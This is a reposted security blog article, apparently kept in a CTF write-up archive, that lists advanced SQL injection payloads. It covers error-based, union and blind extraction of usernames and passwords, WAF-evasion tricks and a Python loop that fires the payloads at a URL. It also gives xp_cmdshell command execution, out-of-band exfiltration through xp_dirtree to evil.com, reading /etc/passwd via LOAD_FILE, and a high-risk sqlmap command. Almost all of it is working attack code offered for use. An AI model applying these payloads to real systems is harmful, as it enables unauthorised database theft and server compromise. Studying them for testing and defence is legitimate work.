# :game_die: Advanced Union-Based Injections

> **Original Source:** [Advanced Union-Based Injections](https://infosecwriteups.com/advanced-sql-injection-techniques-for-ethical-hackers-and-bb-hunters-by-nav1n-65459f25e8d4)
> **Platform:** infosecwriteups.com | **Category:** `MISC`

---

Follow nav1n0x on Twitter: [@nav1n0x](https://twitter.com/nav1n0x)

## Advanced SQL Injection Techniques


Feel free to let me know if you would like any adjustments!


SQL Injection — Image credit: [https://portswigger.net/web-security/sql-injection](https://portswigger.net/web-security/sql-injection)

### Error-Based SQL Injection


Advanced Error Payloads:


```
' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT version()), 0x3a, FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y) -- -
```


### Union-Based Injection


Determining the Number of Columns:


```
' UNION SELECT NULL, NULL, NULL, NULL --
```


Extracting Data:


```
' UNION SELECT username, password, NULL, NULL FROM users --
```


Time-Based Blind:


```
' AND IF(1=1, SLEEP(5), 0) --
```


### Second-Order SQL Injection


Injection in Profile Information: Modify data stored in one place to affect queries executed elsewhere.

### Advanced Union-Based SQL Injection


Union-Based Error Handling: Generate detailed error messages by crafting complex payloads:


```
' UNION SELECT 1, version(), database(), user() FROM dual WHERE 1=CAST((SELECT COUNT(*) FROM information_schema.tables) AS INT) --
```


Union with Hex Encoding: Encode parts of your query to evade WAFs:


```
' UNION SELECT 1, 0x62656e6368, 0x70617373776f7264, user() --
```


Multi-Query Union Injection: Leverage multiple queries to extract more data:


```
' UNION SELECT 1, database(), (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()), user() --
```


Union-Based Cross Database Extraction: Combine data from different databases (when supported):


```
' UNION SELECT 1, (SELECT column_name FROM db1.table1 LIMIT 1), (SELECT column_name FROM db2.table2 LIMIT 1), user() --
```


### Advanced Boolean-Based SQL Injection


Time-Based Boolean Injection with Conditional Responses: Use time delays to infer data based on conditional responses:


```
' AND IF((SELECT LENGTH(database()))>5, SLEEP(5), 0) --
```


Nested Boolean Injections: Nest conditions to extract specific data:


```
' AND IF((SELECT SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 1), 1, 1))='a', SLEEP(5), 0) --
```


Error-Based Boolean Injection: Force errors conditionally to reveal information:


```
' AND IF((SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())>5, (SELECT table_name FROM information_schema.tables), 1) --
```


Using Bitwise Operations: Use [bitwise operations](https://en.wikipedia.org/wiki/Bitwise_operation) for more obfuscation and complexity:


```
' AND IF((SELECT ASCII(SUBSTRING((SELECT database()),1,1))) & 1, SLEEP(5), 0) --
```


### Combining Techniques


Combine multiple advanced techniques for robust and harder-to-detect payloads.


## Get nav1n👨🏻‍💻⚠️’s stories in your inbox


Join Medium for free to get updates from this writer.


Remember me for faster sign in


Example: Union with Time-Based Injection: Create a payload that uses both union and time-based injections:


```
' UNION SELECT IF((SELECT LENGTH(database()))>5, SLEEP(5), 0), 1, user(), 4 --
```


Example: Nested Union and Boolean Injection: Combine nested boolean conditions with union-based data extraction:


```
' UNION SELECT 1, IF((SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())>5, (SELECT table_name FROM information_schema.tables LIMIT 1), 1), 3, 4 --
```


### Automating with Custom Scripts


Automate these advanced techniques using custom scripts to efficiently test and extract data.


Example: Python Script for Advanced Union Injection:


```
import requests

url = "http://example.com/vulnerable.php"
payloads = [
# Advanced Union-Based Injections
"' UNION SELECT 1, version(), database(), user() FROM dual WHERE 1=CAST((SELECT COUNT(*) FROM information_schema.tables) AS INT) -- ",
"' UNION SELECT 1, 0x62656e6368, 0x70617373776f7264, user() -- ",
"' UNION SELECT 1, database(), (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()), user() -- ",
"' UNION SELECT 1, (SELECT column_name FROM db1.table1 LIMIT 1), (SELECT column_name FROM db2.table2 LIMIT 1), user() -- ",
# Advanced Boolean-Based Injections
"' AND IF((SELECT LENGTH(database()))>5, SLEEP(5), 0) -- ",
"' AND IF((SELECT SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 1), 1, 1))='a', SLEEP(5), 0) -- ",
"' AND IF((SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())>5, (SELECT table_name FROM information_schema.tables), 1) -- ",
"' AND IF((SELECT ASCII(SUBSTRING((SELECT database()),1,1))) & 1, SLEEP(5), 0) -- ",
# Combined Techniques
"' UNION SELECT IF((SELECT LENGTH(database()))>5, SLEEP(5), 0), 1, user(), 4 -- ",
"' UNION SELECT 1, IF((SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())>5, (SELECT table_name FROM information_schema.tables LIMIT 1), 1), 3, 4 -- ",
]

for payload in payloads:
response = requests.get(url, params={"id": payload})
print(f"Payload: {payload}")
print(f"Response: {response.text}\n")
```


### Advanced Enumeration


Database Fingerprinting:


MySQL:


```
' OR 1=1 AND @@version --
```


PostgreSQL:


```
' OR 1=1 AND version() --
```


MSSQL:


```
' OR 1=1 AND @@version --
```


Column Enumeration: Determine the Number of Columns:


```
' ORDER BY 1 --
' ORDER BY 2 --
```


Extract Column Names:


```
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users' --
```


### Advanced Data Extraction


Combine Multiple Rows into a Single Output:


```
' UNION SELECT GROUP_CONCAT(username, 0x3a, password) FROM users --
```


### Bypassing Filters and WAFs


Obfuscation:Using Comments:


```
' UNION//SELECT//NULL,NULL,NULL --
```


Case Manipulation: Changing the case of SQL keywords:


```
' uNioN SeLecT NULL, NULL --
```


Inline Comments: Inserting inline comments:


```
' UNION//SELECT//NULL,NULL --
```


Whitespace Manipulation: Using different types of whitespace characters:


```
' UNION%0D%0ASELECT%0D%0A NULL,NULL --
```


### Exploiting Advanced Scenarios


Stored Procedures: Execute arbitrary SQL:


```
'; EXEC xp_cmdshell('whoami') --
```


Out-of-Band SQL Injection: Exfiltrate data via DNS or HTTP requests:


```
'; EXEC master..xp_dirtree '\\evil.com\payload' --
```


Leveraging Privileges: Reading or writing files:


```
' UNION SELECT LOAD_FILE('/etc/passwd') --
```


## Automation and Custom Scripts


Custom SQLMap Commands: Bypass WAFs or target specific injection points:


```
sqlmap -u "http://example.com/vulnerable.php?id=1" --tamper=space2comment --level=5 --risk=3
```


This article is a part of series “Advanced SQL injection”

---

*Originally published on [Medium](https://infosecwriteups.com/advanced-sql-injection-techniques-for-ethical-hackers-and-bb-hunters-by-nav1n-65459f25e8d4). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of misc CTF writeups.*
